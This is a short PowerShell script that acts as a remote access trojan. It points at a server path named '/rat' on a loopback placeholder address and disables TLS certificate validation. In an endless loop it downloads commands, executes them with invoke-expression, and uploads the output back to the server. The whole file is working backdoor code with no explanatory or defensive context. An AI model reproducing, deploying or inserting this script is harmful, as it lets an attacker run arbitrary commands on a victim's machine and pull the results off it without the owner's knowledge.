$s = "https://127.0.0.1/rat"
$w = New-Object Net.WebClient
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
while($true)
{

$r = $w.DownloadString("$s")
while($r) {
	$o = invoke-expression $r | out-string 
	$w.UploadString("$s", $o)	
	break
}
}
